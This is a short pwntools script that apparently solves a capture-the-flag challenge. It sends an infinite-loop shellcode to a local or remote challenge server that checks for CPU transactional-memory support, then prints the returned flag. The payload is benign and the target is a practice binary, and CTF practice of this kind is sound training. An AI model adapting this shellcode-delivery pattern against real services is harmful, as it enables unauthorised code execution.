#!/usr/bin/env python
from pwn import *

shellcode = asm("""
L1:
    jmp L1
""", arch="amd64")

if args.RHOST:
    target = remote(args.RHOST, 10101)
else:
    target = process("build/server")
cpuinfo_flags = target.recvline()
assert cpuinfo_flags.find("rtm") != -1
target.send(shellcode)
target.shutdown("send")
print("FLAG: " + target.recv(40))
target.close()
